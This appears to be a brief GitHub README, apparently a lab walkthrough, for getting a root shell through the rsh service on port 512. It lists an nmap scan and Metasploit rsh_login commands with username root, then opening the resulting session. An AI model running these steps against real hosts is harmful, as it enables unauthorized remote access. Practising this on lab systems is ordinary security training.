# Port-512-netkit-rsh-rexecd
1.nmap -sV (target ip)
![image](https://github.com/thanawut2903/Port-512-netkit-rsh-rexecd/assets/159118913/8a152fce-e5ea-459e-9eb1-1aaf7e9f1856)

2.msfconsole

3.msf 6 > use auxiliary/scanner/rservices/rsh_login

![image](https://github.com/thanawut2903/Port-512-netkit-rsh-rexecd/assets/159118913/07be47df-0edf-49c2-b87d-84685bdc0f44)

4.msf 6 > set RHOST (target ip)

5.msf6 > set username root

6.msf 6 > run

![image](https://github.com/thanawut2903/Port-512-netkit-rsh-rexecd/assets/159118913/9477a2ed-c8ae-4e32-ba9f-ff2fa9b66004)

7.msf 6 > sessions -i 1


![image](https://github.com/thanawut2903/Port-512-netkit-rsh-rexecd/assets/159118913/375fb615-d5e8-4bbd-99da-2e94538b131e)



Reference form : https://www.youtube.com/watch?v=zyILGFWvAVs
